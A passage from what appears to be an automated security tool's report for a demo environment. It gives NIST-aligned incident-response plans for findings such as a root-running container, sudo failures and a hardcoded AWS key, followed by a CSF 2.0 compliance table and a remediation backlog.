- **impact:** {"asset_criticality": "high", "exposure": "external", "blast_radius": "business-unit; artifacts: demo/env/app/Dockerfile:17", "data_at_risk": "Undetermined - confirm during analysis", "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).", "actively_exploited": false}
- **required approvals:** Platform
- **evidence preservation:**
  - Snapshot affected host(s) / container(s) before making changes.
  - Export the relevant raw logs to write-once storage and record SHA-256 hashes.
  - Capture volatile state (process list, network connections) if a host may be compromised.
  - Record a timeline: who did what, when, in the incident ticket.
- **steps:**
  1. **[contain]** Assess whether affected containers are running in production; restrict exposure - owner: Platform _(needs human approval)_
     - change: `Apply network policy / scale down non-essential exposure`
     - rollback: Restore exposure after fix
     - verify: Blast radius reduced and documented
  2. **[eradicate]** Fix the Dockerfile/image (non-root USER, pinned digest, no remote ADD, TLS verify on) and rebuild - owner: Platform _(needs human approval)_
     - change: `Edit Dockerfile; rebuild; re-scan the image`
     - rollback: Redeploy previous image
     - verify: Re-scan shows the misconfiguration resolved
  3. **[recover]** Roll the hardened image out across environments - owner: Platform _(needs human approval)_
     - rollback: Roll back to previous image
     - verify: All workloads on the hardened image; healthy
  4. **[post-incident]** Add hadolint/trivy config checks to CI and an admission policy (e.g. no :latest, no root) - owner: Platform _(needs human approval)_
     - verify: CI and admission controller reject non-compliant images

<details><summary>Comms draft</summary>

```
SECURITY NOTIFICATION (INTERNAL - DRAFT)

Summary: Container runs as root (no non-root USER instruction) in Dockerfile:17
Priority: P2   SLA: Begin containment within 4 hours
Affected: demo/env/app/Dockerfile:17
Detected by: vuln_scanner at 2026-09-05T16:02:59+00:00

What we know: Container runs as root (no non-root USER instruction)
Immediate actions proposed: Assess whether affected containers are running in production; restrict exposure

This is an automated draft. Confirm details and obtain approval before
executing any containment or eradication step.
```

</details>

### IR plan: Privilege-escalation attempts via sudo (2 event(s))

- **priority:** P2  •  **SLA:** Begin containment within 4 hours
- **findings:** `F-f1c73039b1c6`
- **NIST SP 800-61:** Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity
- **impact:** {"asset_criticality": "high", "exposure": "external", "blast_radius": "business-unit; artifacts: demo/env/var/log/auth.log", "data_at_risk": "Undetermined - confirm during analysis", "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).", "actively_exploited": false}
- **required approvals:** Asset owner, Security
- **evidence preservation:**
  - Snapshot affected host(s) / container(s) before making changes.
  - Export the relevant raw logs to write-once storage and record SHA-256 hashes.
  - Capture volatile state (process list, network connections) if a host may be compromised.
  - Record a timeline: who did what, when, in the incident ticket.
- **steps:**
  1. **[contain]** Limit exposure of the affected asset while the issue is investigated - owner: Asset owner _(needs human approval)_
     - change: `Apply the least-disruptive mitigation available`
     - rollback: Remove mitigation after fix
     - verify: Exposure reduced
  2. **[eradicate]** Apply the fix recommended in the finding - owner: Asset owner _(needs human approval)_
     - change: `See finding.recommended_fix`
     - rollback: Revert the change
     - verify: Re-scan confirms resolution
  3. **[recover]** Return the asset to normal operation with monitoring - owner: Asset owner _(needs human approval)_
     - verify: Asset healthy
  4. **[post-incident]** Add a detection/prevention control and document lessons learned - owner: Security _(needs human approval)_
     - verify: Control in place

<details><summary>Comms draft</summary>

```
SECURITY NOTIFICATION (INTERNAL - DRAFT)

Summary: Privilege-escalation attempts via sudo (2 event(s))
Priority: P2   SLA: Begin containment within 4 hours
Affected: demo/env/var/log/auth.log
Detected by: log_monitor at 2026-09-05T16:02:59+00:00

What we know: Repeated sudo authentication failures or use by a user not in sudoers.
Immediate actions proposed: Limit exposure of the affected asset while the issue is investigated

This is an automated draft. Confirm details and obtain approval before
executing any containment or eradication step.
```

</details>

### IR plan: Hardcoded secret (aws_access_key_id) in settings.py:4

- **priority:** P2  •  **SLA:** Begin containment within 4 hours
- **findings:** `F-014c834cd5cd`
- **NIST SP 800-61:** Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity
- **impact:** {"asset_criticality": "high", "exposure": "external", "blast_radius": "business-unit; artifacts: settings.py:4", "data_at_risk": "Credentials and anything they authorize", "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).", "actively_exploited": false}
- **required approvals:** Owning team, Platform
- **evidence preservation:**
  - Snapshot affected host(s) / container(s) before making changes.
  - Export the relevant raw logs to write-once storage and record SHA-256 hashes.
  - Capture volatile state (process list, network connections) if a host may be compromised.
  - Record a timeline: who did what, when, in the incident ticket.
- **steps:**
  1. **[contain]** Revoke / rotate the exposed credential immediately and invalidate sessions - owner: Owning team _(needs human approval)_
     - change: `Revoke the key/token at the provider; issue a replacement via the secrets manager`
     - verify: Old credential returns 401/403; new one works
  2. **[eradicate]** Remove the secret from the repository and its git history - owner: Owning team _(needs human approval)_
     - change: `git filter-repo / BFG to purge; force-push; add a pre-commit secret scanner`
     - verify: Secret absent from all branches and history; pre-commit hook active
  3. **[eradicate]** Review provider/audit logs for misuse of the old credential - owner: SOC
     - verify: Analyst sign-off on misuse assessment
  4. **[recover]** Confirm the replacement credential is in use everywhere it is needed - owner: Owning team _(needs human approval)_
     - verify: All consumers healthy on the new secret
  5. **[post-incident]** Move secrets to a manager; add CI secret scanning; brief the team - owner: Platform _(needs human approval)_
     - verify: No plaintext secrets in repos; CI gate enforced

<details><summary>Comms draft</summary>

```
SECURITY NOTIFICATION (INTERNAL - DRAFT)

Summary: Hardcoded secret (aws_access_key_id) in settings.py:4
Priority: P2   SLA: Begin containment within 4 hours
Affected: settings.py:4
Detected by: vuln_scanner at 2026-09-05T16:02:59+00:00

What we know: A credential-like string is committed to the repository.
Immediate actions proposed: Revoke / rotate the exposed credential immediately and invalidate sessions

This is an automated draft. Confirm details and obtain approval before
executing any containment or eradication step.
```

</details>

### IR plan: apt-get install without cleaning apt lists in Dockerfile:9

- **priority:** P3  •  **SLA:** Remediate within 2 business days
- **findings:** `F-e43293fc771f`
- **NIST SP 800-61:** Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity
- **impact:** {"asset_criticality": "high", "exposure": "external", "blast_radius": "business-unit; artifacts: demo/env/app/Dockerfile:9", "data_at_risk": "Undetermined - confirm during analysis", "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).", "actively_exploited": false}
- **required approvals:** Platform
- **evidence preservation:**
  - Snapshot affected host(s) / container(s) before making changes.
  - Export the relevant raw logs to write-once storage and record SHA-256 hashes.
  - Capture volatile state (process list, network connections) if a host may be compromised.
  - Record a timeline: who did what, when, in the incident ticket.
- **steps:**
  1. **[contain]** Assess whether affected containers are running in production; restrict exposure - owner: Platform _(needs human approval)_
     - change: `Apply network policy / scale down non-essential exposure`
     - rollback: Restore exposure after fix
     - verify: Blast radius reduced and documented
  2. **[eradicate]** Fix the Dockerfile/image (non-root USER, pinned digest, no remote ADD, TLS verify on) and rebuild - owner: Platform _(needs human approval)_
     - change: `Edit Dockerfile; rebuild; re-scan the image`
     - rollback: Redeploy previous image
     - verify: Re-scan shows the misconfiguration resolved
  3. **[recover]** Roll the hardened image out across environments - owner: Platform _(needs human approval)_
     - rollback: Roll back to previous image
     - verify: All workloads on the hardened image; healthy
  4. **[post-incident]** Add hadolint/trivy config checks to CI and an admission policy (e.g. no :latest, no root) - owner: Platform _(needs human approval)_
     - verify: CI and admission controller reject non-compliant images

<details><summary>Comms draft</summary>

```
SECURITY NOTIFICATION (INTERNAL - DRAFT)

Summary: apt-get install without cleaning apt lists in Dockerfile:9
Priority: P3   SLA: Remediate within 2 business days
Affected: demo/env/app/Dockerfile:9
Detected by: vuln_scanner at 2026-09-05T16:02:59+00:00

What we know: apt-get install without cleaning apt lists
Immediate actions proposed: Assess whether affected containers are running in production; restrict exposure

This is an automated draft. Confirm details and obtain approval before
executing any containment or eradication step.
```

</details>

### IR plan: API active testing skipped (no --allow-active / not on allowlist)

- **priority:** P4  •  **SLA:** Track in the normal backlog
- **findings:** `F-817e9ba6560b`
- **NIST SP 800-61:** Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity
- **impact:** {"asset_criticality": "high", "exposure": "external", "blast_radius": "business-unit; artifacts: https://api.acme.example/v1/pay", "data_at_risk": "Undetermined - confirm during analysis", "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).", "actively_exploited": false}
- **required approvals:** Asset owner, Security
- **evidence preservation:**
  - Snapshot affected host(s) / container(s) before making changes.
  - Export the relevant raw logs to write-once storage and record SHA-256 hashes.
  - Capture volatile state (process list, network connections) if a host may be compromised.
  - Record a timeline: who did what, when, in the incident ticket.
- **steps:**
  1. **[contain]** Limit exposure of the affected asset while the issue is investigated - owner: Asset owner _(needs human approval)_
     - change: `Apply the least-disruptive mitigation available`
     - rollback: Remove mitigation after fix
     - verify: Exposure reduced
  2. **[eradicate]** Apply the fix recommended in the finding - owner: Asset owner _(needs human approval)_
     - change: `See finding.recommended_fix`
     - rollback: Revert the change
     - verify: Re-scan confirms resolution
  3. **[recover]** Return the asset to normal operation with monitoring - owner: Asset owner _(needs human approval)_
     - verify: Asset healthy
  4. **[post-incident]** Add a detection/prevention control and document lessons learned - owner: Security _(needs human approval)_
     - verify: Control in place

<details><summary>Comms draft</summary>

```
SECURITY NOTIFICATION (INTERNAL - DRAFT)

Summary: API active testing skipped (no --allow-active / not on allowlist)
Priority: P4   SLA: Track in the normal backlog
Affected: https://api.acme.example/v1/pay
Detected by: vuln_scanner at 2026-09-05T16:02:59+00:00

What we know: 1 endpoint(s) provided. Active testing requires target.allow_active=true and each host present in target.allowlist.
Immediate actions proposed: Limit exposure of the affected asset while the issue is investigated

This is an automated draft. Confirm details and obtain approval before
executing any containment or eradication step.
```

</details>

## Compliance - NIST Cybersecurity Framework 2.0

_Representative 12-subcategory subset for demonstration. Not the full CSF 2.0 catalog._

- **evaluated controls:** 12
- **coverage:** 66.7%
- **failing / partial:** PR.AA-01, PR.AA-05, DE.CM-09, ID.RA-01, ID.RA-05, PR.PS-01, PR.PS-02, PR.PS-06

| Control | Title | Status | Evidence | Effort |
| --- | --- | --- | --- | --- |
| PR.AA-01 | Identities and credentials for authorized users are managed | Not Met | F-014c834cd5cd, F-4dde57b4f8be, F-83069228f1b0 | M (days) |
| PR.AA-05 | Access permissions and authorizations are managed, incorporating least privilege | Not Met | F-976af72625aa, F-f1c73039b1c6 | M (days) |
| DE.CM-01 | Networks and network services are monitored to find potentially adverse events | Not Assessed | - | - |
| DE.CM-09 | Computing hardware and software, runtime environments, and their data are monitored | Not Met | F-3c0e8bd0a3a2, F-4c70da6fa645, F-8bd7e433f512, F-c87d3959274e, F-f3be33a4a8b1 | M (days) |
| DE.AE-02 | Potentially adverse events are analyzed to better understand associated activities | Not Assessed | - | - |
| ID.RA-01 | Vulnerabilities in assets are identified, validated, and recorded | Not Met | F-3c0e8bd0a3a2, F-4d73c8cbff46, F-c3b8551319dc, F-c87d3959274e, F-ce3694347c63, F-f1c73039b1c6 | M (days) - coordinated change |
| ID.RA-05 | Threats, vulnerabilities, likelihoods, and impacts are used to understand inherent risk | Not Met | F-83069228f1b0, F-c87d3959274e, F-ce3694347c63 | M (days) - coordinated change |
| PR.PS-01 | Configuration management practices are established and applied | Not Met | F-7fc2198b44a0, F-976af72625aa, F-baff40d64173, F-e43293fc771f | M (days) |
| PR.PS-02 | Software is maintained, replaced, and removed commensurate with risk | Not Met | F-4d73c8cbff46, F-c3b8551319dc, F-ce3694347c63 | M (days) - coordinated change |
| PR.PS-06 | Secure software development practices are integrated and their performance monitored | Not Met | F-014c834cd5cd, F-4c70da6fa645, F-8bd7e433f512 | M (days) |
| RS.MA-01 | The incident response plan is executed in coordination with relevant third parties | Not Assessed | - | - |
| RS.AN-03 | Analysis is performed to establish what has taken place during an incident | Not Assessed | - | - |

### Remediation backlog (worst first)

- **ID.RA-01** (Not Met, worst critical, M (days) - coordinated change): Add/verify a WAF rule for this payload class, rate-limit or block the source, and audit the targeted endpoint for the underlying injection flaw.; Block 198.51.100.23 at the perimeter and hunt for other activity from it.; Review sudoers, alert on repeated failures, and confirm the account owner.; Upgrade jinja2 to >= 2.10.1 (fixes CVE-2019-10906).; Upgrade pyyaml to >= 5.4 (fixes CVE-2020-14343).; Upgrade pyyaml to >= 5.4 and redeploy.
- **ID.RA-05** (Not Met, worst critical, M (days) - coordinated change): Block 198.51.100.23 at the perimeter and hunt for other activity from it.; Block 203.0.113.66 at the perimeter and hunt for other activity from it.; Upgrade pyyaml to >= 5.4 and redeploy.
- **PR.PS-02** (Not Met, worst critical, M (days) - coordinated change): Upgrade jinja2 to >= 2.10.1 (fixes CVE-2019-10906).; Upgrade pyyaml to >= 5.4 (fixes CVE-2020-14343).; Upgrade pyyaml to >= 5.4 and redeploy.
- **PR.AA-01** (Not Met, worst high, M (days)): Block 203.0.113.66 at the perimeter and hunt for other activity from it.; Block the source IP at the edge, lock/reset the targeted account(s), enforce MFA, and deploy rate-limiting / fail2ban on the auth service.; Revoke/rotate the credential now, remove it from git history, and load it from a secrets manager or environment variable.
- **PR.AA-05** (Not Met, worst high, M (days)): Add a non-root `USER` instruction and make required paths writable by that UID.; Review sudoers, alert on repeated failures, and confirm the account owner.
- **DE.CM-09** (Not Met, worst high, M (days)): Add/verify a WAF rule for this payload class, rate-limit or block the source, and audit the targeted endpoint for the underlying injection flaw.; Block 198.51.100.23 at the perimeter and hunt for other activity from it.
- **PR.PS-01** (Not Met, worst high, M (days)): Add a non-root `USER` instruction and make required paths writable by that UID.; Append `&& rm -rf /var/lib/apt/lists/*` to shrink layers and attack surface.; Pin the base image to an immutable digest (FROM image@sha256:...).; Use COPY for local files; download with verified checksums in a RUN step.
- **PR.PS-06** (Not Met, worst high, M (days)): Add/verify a WAF rule for this payload class, rate-limit or block the source, and audit the targeted endpoint for the underlying injection flaw.; Revoke/rotate the credential now, remove it from git history, and load it from a secrets manager or environment variable.

### Finding -> control matrix

- `F-4dde57b4f8be` -> PR.AA-01
- `F-83069228f1b0` -> PR.AA-01, ID.RA-05
- `F-014c834cd5cd` -> PR.AA-01, PR.PS-06
- `F-976af72625aa` -> PR.AA-05, PR.PS-01
- `F-f1c73039b1c6` -> PR.AA-05, ID.RA-01
- `F-8bd7e433f512` -> DE.CM-09, PR.PS-06
- `F-4c70da6fa645` -> DE.CM-09, PR.PS-06
- `F-3c0e8bd0a3a2` -> DE.CM-09, ID.RA-01
- `F-f3be33a4a8b1` -> DE.CM-09
- `F-c87d3959274e` -> DE.CM-09, ID.RA-01, ID.RA-05
- `F-ce3694347c63` -> ID.RA-01, ID.RA-05, PR.PS-02
- `F-c3b8551319dc` -> ID.RA-01, PR.PS-02
- `F-4d73c8cbff46` -> ID.RA-01, PR.PS-02
- `F-baff40d64173` -> PR.PS-01
- `F-7fc2198b44a0` -> PR.PS-01
- `F-e43293fc771f` -> PR.PS-01
